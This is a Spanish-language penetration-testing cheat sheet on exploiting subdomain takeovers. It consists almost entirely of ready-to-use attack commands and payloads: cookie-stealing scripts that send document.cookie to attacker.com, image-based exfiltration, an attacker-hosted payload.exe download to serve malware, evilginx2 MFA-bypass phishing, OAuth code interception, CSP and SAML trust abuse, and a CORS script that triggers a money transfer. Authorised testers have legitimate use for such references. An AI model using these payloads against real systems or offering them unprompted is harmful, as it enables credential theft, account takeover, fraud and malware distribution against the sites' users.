---
aliases:
  - SDT Phishing
  - Cookie Scope Abuse
  - OAuth Trust Transfer
  - CSP Subdomain Bypass
tags:
  - type/cheatsheet
  - vuln/subdomain-takeover
  - technique/initial-access
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Subdomain Takeover]]'
---
# Subdomain Takeover - Vectores de Explotación

***

## Phishing con Subdomain Legítimo

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `certbot --apache -d login.target.com --email me@me.com --agree-tos` | Let's Encrypt cert para subdomain reclamado | HTTPS valid → padlock visible. |
| Configurar fake login form en `login.target.com` post-takeover | Credential phishing landing | Standard credential theft. |
| `python3 -c "import smtplib; ..."` con link `https://reset.target.com/reset?t=fake` | Email phishing con subdomain legítimo | High-yield credential theft. |
| `gophish` campaign apuntando a takeover subdomain | Mass email phishing | Bulk attack. |
| `evilginx2 -p phishlets/` con subdomain reclamado | MITM phishing con session capture | Auto bypass MFA. |
| Subir webshell `wget https://attacker/payload.exe -O /var/www/x.exe && chmod +x x.exe` y servir desde `download.target.com` | High-trust binary distribution | Malware distribution. |
| Defacement: `echo "<h1>Owned</h1>" > /var/www/index.html` | PR / brand damage PoC | Demonstration. |
^sdt-vector-phishing

___

## Cookie Scope Abuse (Domain=`.target.com`)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<script>fetch('https://attacker.com/log',{method:'POST',body:document.cookie})</script>` en takeover subdomain | Read parent domain cookies (sin HttpOnly) | Cookie con `Domain=.target.com`. |
| `document.cookie = "session=ATTACKER_SESSION; Domain=.target.com; Path=/"` | Set cookie en parent domain | Session fixation. |
| `<script>document.cookie = "csrf_token=ATTACKER_TOKEN; Domain=.target.com"</script>` | CSRF token cookie tossing | Combine con CSRF. |
| `curl -sI https://target.com/login \| grep -i set-cookie` | Verificar atributos cookie (HttpOnly, Domain, Secure, SameSite) | Pre-attack analysis. |
| `<script>const c=document.cookie.split(';').filter(x=>x.includes('session'))[0]; new Image().src='https://attacker.com/exfil?c='+encodeURIComponent(c)</script>` | Image-based exfil | Stealth alternative. |
| `Set-Cookie: session=ATK; Domain=.target.com; Path=/` (server-set en takeover) | Server-side cookie set | Pre-flight session fixation. |
^sdt-vector-cookie

### PoC cookie steal via takeover

```html
<!-- En takeover-sub.target.com -->
<script>
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      url: location.href,
      ua: navigator.userAgent
    })
  });
</script>
```

___

## OAuth `redirect_uri` Trust Transfer

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `https://idp.target.com/oauth/authorize?client_id=APP&redirect_uri=https://taken.target.com/cb&response_type=code&scope=email` | Code grant interceptado en takeover | Wildcard `*.target.com` whitelist. |
| `https://idp.target.com/oauth/authorize?response_type=token&client_id=APP&redirect_uri=https://taken.target.com#access_token=...` | Implicit flow → token directo en fragment | response_type=token habilitado. |
| `nc -lvnp 443` en takeover sub para capturar `?code=` | Listener post-redirect | Setup phishing flow. |
| `curl -X POST https://idp.target.com/oauth/token -d "code=$STOLEN&client_id=APP&client_secret=$LEAK&redirect_uri=https://taken.target.com/cb"` | Exchange code por access_token | Public client / secret leaked. |
| `curl -H "Authorization: Bearer $TOKEN" https://api.target.com/me` | Acceso API como víctima | Post-token. |
| Setup mobile redirect: `intent://taken.target.com/cb#Intent;scheme=https;...` | Mobile OAuth flow takeover | Mobile chain. |
^sdt-vector-oauth

___

## CSP Subdomain Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI https://target.com \| grep -i content-security-policy` | Lista CSP directives + sources | Pre-attack CSP analysis. |
| Verificar `script-src *.target.com` en CSP → identificar takeover sub | CSP source whitelisted | Standard CSP bypass setup. |
| Hostear `evil.js` en `cdn.target.com` (taken) post-takeover | Script source whitelisted | XSS via subdomain. |
| Inyectar `<script src="https://taken.target.com/evil.js"></script>` en XSS | XSS bypass strict CSP | Combo XSS + SDT. |
| `<iframe src="https://taken.target.com/phish.html"></iframe>` | Frame-src bypass | UI redress. |
| `fetch('https://taken.target.com/exfil', {method:'POST', body:document.cookie})` con CSP `connect-src *.target.com` | Data exfil via connect-src | Data egress. |
| `<base href="https://taken.target.com/">` (HTML injection) | base-uri hijack | Path-relative URL abuse. |
^sdt-vector-csp

___

## SAML SP / IdP Trust

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl https://idp.target.com/saml/metadata \| xmllint --xpath '//AssertionConsumerService/@Location'` | Lista ACS URLs trusted | SAML SP recon. |
| Hostear malicious SAML SP en takeover subdomain con `AssertionConsumerService` URL | Recibir SAML responses con asserciones | SP ACS URL takeover. |
| Hostear malicious IdP metadata XML en takeover sub | Atacante's SAML IdP trusted | IdP metadata takeover. |
| `samltool.com` o `python3 -c "from saml2 import ..."` para parse SAML response capturada | Decode SAML assertion + extract user attrs | Post-capture. |
| Hostear malicious logout URL en takeover sub | Force logout + phish chain | SAML logout. |
| Replay SAML response con `curl -X POST -d "SAMLResponse=$CAPTURED" https://victim/sp/saml` | SAML replay post-capture | Auth bypass. |
^sdt-vector-saml

___

## CORS Allowlist Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI -H "Origin: https://taken.target.com" https://api.target.com/data \| grep -i access-control` | Verifica CORS reflejado para takeover origin | CORS allowlist `*.target.com`. |
| Verificar `Access-Control-Allow-Credentials: true` + `Access-Control-Allow-Origin: <taken>` | High-impact CORS misconfig | Cookie-bearing requests. |
| `<script>fetch('https://api.target.com/data', {credentials:'include'}).then(r=>r.text()).then(d=>fetch('//attacker?d='+encodeURIComponent(d)))</script>` en takeover sub | Read sensitive API data con cookies víctima | Data exfil. |
| `<script>fetch('https://api.target.com/transfer', {method:'POST', credentials:'include', body:JSON.stringify({to:'attacker',amount:1000}), headers:{'Content-Type':'application/json'}})</script>` | Trigger sensitive action via CORS | CSRF + CORS combo. |
| `<script>const ws=new WebSocket('wss://api.target.com/socket'); ws.onopen=()=>...</script>` en takeover sub | CSWSH (WebSocket CSRF) via subdomain trust | WS Origin check. |
| `<script>window.addEventListener('message', e => fetch('//attacker?'+JSON.stringify(e.data))); window.parent.postMessage('test','*');</script>` | postMessage bypass via Origin trust | Cross-window. |
^sdt-vector-cors

***
